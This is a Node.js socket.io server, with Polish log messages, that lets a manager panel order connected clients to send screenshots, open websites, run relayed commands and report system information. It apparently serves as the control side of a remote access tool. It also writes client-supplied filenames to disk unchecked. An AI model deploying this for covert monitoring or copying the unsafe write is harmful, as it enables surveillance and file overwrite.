const express = require('express')
const app = express();
const server = require('http').createServer(app);
const sio = require('socket.io')(server);
const swig = require('swig')
const fs = require('fs')
const path = require('path')

app.engine('html', swig.renderFile)
app.set('view engine', 'html');


let clients = [];

app.get('/', (req, res) => {
    res.render('index.html', {clients: clients})
});

app.get('/client/:clientId/', (req, res) => {
    const clientIndex = clients.indexOf(`/clients#${req.params.clientId}`)
    const client = clients[clientIndex]
    if (!client) res.redirect('/');
    else {
        res.render('client.html', {client: client})
    }

})

app.use('/public', express.static(__dirname + '/public'));

server.listen(3000, () => {
    console.log('listening on *:3000');
})


const clientNamespace = sio.of('/clients')

clientNamespace.on('connection', socket => {
    console.log(`Client ${socket.id} connected`)
    clients.push(socket.id);
    socket.join(socket.id);
    managerNamespace.emit('client_connected', {client: socket.id})
    managerNamespace.emit('notification', {message: `Polaczono ${socket.id}`, pos: 'bottom-right', status: 'success'})
    //clientNamespace.emit('screenshot');

    socket.on('disconnect', () => {
        console.log(clients);
        const clientId = clients.indexOf(socket.id)
        clients.splice(clientId, 1)
        console.log(`Client ${socket.id} disconnected`)
        managerNamespace.emit('client_disconnected', {client: socket.id})
        managerNamespace.emit('notification', {message: `Rozlaczono ${socket.id}`, pos: 'bottom-right', status: 'danger'})
    })

    socket.on('get_screenshoot', (data) => {
        console.log(data);
        const image = data.img
        const filename = data.filename
        const ssDir = `public/screenshoots/${socket.id}`;
        if (!fs.existsSync(ssDir)) {
            fs.mkdirSync(ssDir)
        }
        fs.writeFile(path.join(ssDir, filename), image, (e) => {
            if (e) {
                return console.log(e);
            }
            console.log(`File ${filename} saved`);
        })
        sio.of('/manager').emit('ss_btn', {state: true})
    })

    socket.on('website', () => {
        sio.of('/manager').emit('website_btn', {state: true})
        sio.of('/manager').emit('notification', {message: ''})
    })

    socket.on('command', (data) => {
        sio.of('/manager').emit('command', data);
    })

    socket.on('systemInfo', (data) => {
        sio.of('/manager').emit('systemInfo', data)
    })
})

const managerNamespace = sio.of('/manager')

managerNamespace.on('connection', socket => {
    console.log('Manager connected')

    socket.on('screenshoot', (data) => {
        console.log('Manager chce ss')
        if (data && data.clientId) {
            sio.of('/clients').to(data.clientId).emit('screenshot');
        } else {
            sio.of('/clients').emit('screenshot');
        }
        sio.of('/manager').emit('ss_btn', {state: false})
    })

    socket.on('website', (data) => {
        console.log('Manager chce otworzyc strone')
        console.log(data);
        if (data && data.clientId) {
            sio.of('/clients').to(data.clientId).emit('website', data)
        } else {
            sio.of('/clients').emit('website', data)
        }
        sio.of('/manager').emit('website_btn', {state: false})
    })

    socket.on('command', (data) => {
        console.log('Manager chce przeslac komende')
        if (data && data.clientId) {
            sio.of('/clients').to(data.clientId).emit('command', data)
        } else {
            sio.of('/clients').emit('command', data)
        }
    })

    socket.on('getSystemInfoFromClient', (data) => {
        console.log(data);
        // Wykonujemy zapytanie do klienta by przeslal info o systemie
        sio.of('/clients').to(data.clientId).emit('systemInfo');
    })

    socket.on('fetchSystemInfo', (data) => {
        console.log(data);
    })
})